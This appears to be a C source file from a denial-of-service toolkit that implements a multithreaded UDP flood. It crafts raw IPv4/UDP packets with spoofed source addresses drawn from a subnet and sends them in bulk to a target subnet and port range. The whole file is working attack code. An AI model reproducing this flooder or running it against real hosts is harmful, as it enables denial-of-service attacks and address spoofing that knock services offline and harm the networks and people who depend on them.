#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/subnet_mask.h"
#include "../ddos/udp_flood.h"

#define REQUEST_PER_THREAD 1000

#define DATA "Hello, This is Data!"

unsigned long udp_total;
unsigned long udp_produced;

char udp_src_ip[16] = {0, }; // fixed value
char udp_dest_ip[16] = {0, };
int udp_src_mask;
int udp_dest_mask;
int udp_dest_port_start;
int udp_dest_port_end;

char udp_now_src[16] = {0, }; // variable
char udp_now_dest[16] = {0, };
int udp_now_port = 0;

pthread_mutex_t udp_mutex = PTHREAD_MUTEX_INITIALIZER;

pthread_cond_t udp_cond;

void udp_flood_print_usage(void)
{
	printf("UDP flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests, Default: 1 Loop] \n");
}

void *generate_udp_request(void *data)
{
	int sock = make_socket(IPPROTO_UDP);
	while (1) {
		struct udphdr *p;
		char buffer[sizeof(struct udphdr)];
		memset(buffer, 0x00, sizeof(struct udphdr));

		pthread_mutex_lock(&udp_mutex);

		generator(udp_src_ip, udp_dest_ip, udp_src_mask, udp_dest_mask, udp_dest_port_start, udp_dest_port_end, udp_now_src, udp_now_dest, &udp_now_port);

		//make protocol
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_UDP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(udp_now_src));
		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(udp_now_dest));

		p = (struct udphdr *) buffer;
		p->check = 0;
		p->src_port = htons(0);
		p->dest_port = htons(udp_now_port);
		strcpy(p->data, DATA);
		p->len = htons(strlen(DATA));

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct udphdr));
		char *packet = packet_assemble(ipv4_h, p, sizeof(struct udphdr));

		if (udp_produced >= udp_total) {
			pthread_mutex_unlock(&udp_mutex);
			pthread_cond_broadcast(&udp_cond);
			return 0;
		}

		send_packet(sock, ipv4_h, packet, udp_now_port);
		free(packet);
		udp_produced++;

		pthread_mutex_unlock(&udp_mutex);
	}
	close(sock);
	return 0;
}


void udp_flood_run(char *argv[])
{
	int argc = 0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (argc != 3 && argc != 4) {
		udp_flood_print_usage();
		return;
	}

	split_ip_mask_port(argv, udp_src_ip, udp_dest_ip, &udp_src_mask, &udp_dest_mask, &udp_dest_port_start, &udp_dest_port_end);

	udp_produced = 0;

	if(argc == 4) udp_total = atoi(argv[3]);
	else udp_total = (unsigned long)pow(2, 32-udp_src_mask) * (unsigned long)pow(2, 32-udp_dest_mask) * (udp_dest_port_end-udp_dest_port_start+1);

	int num_threads = udp_total / REQUEST_PER_THREAD;

	int *generate_thread_id;
	pthread_t generate_thread[9999];

	int i;


	printf("Sending UDP requests to %s using %d threads\n",argv[1], num_threads);

	for (i = 0; i < num_threads; i++) 
		pthread_create(&generate_thread[i], NULL, generate_udp_request, NULL);

	for (i = 0; i < num_threads; i++) {
		void *status;
		pthread_join(generate_thread[i], NULL);
		printf("thread %d joined\n", i);
	}

	pthread_mutex_destroy(&udp_mutex);
	pthread_exit(NULL);

	printf("UDP flood finished\nTotal %lu packets sent.\n",udp_produced);
}
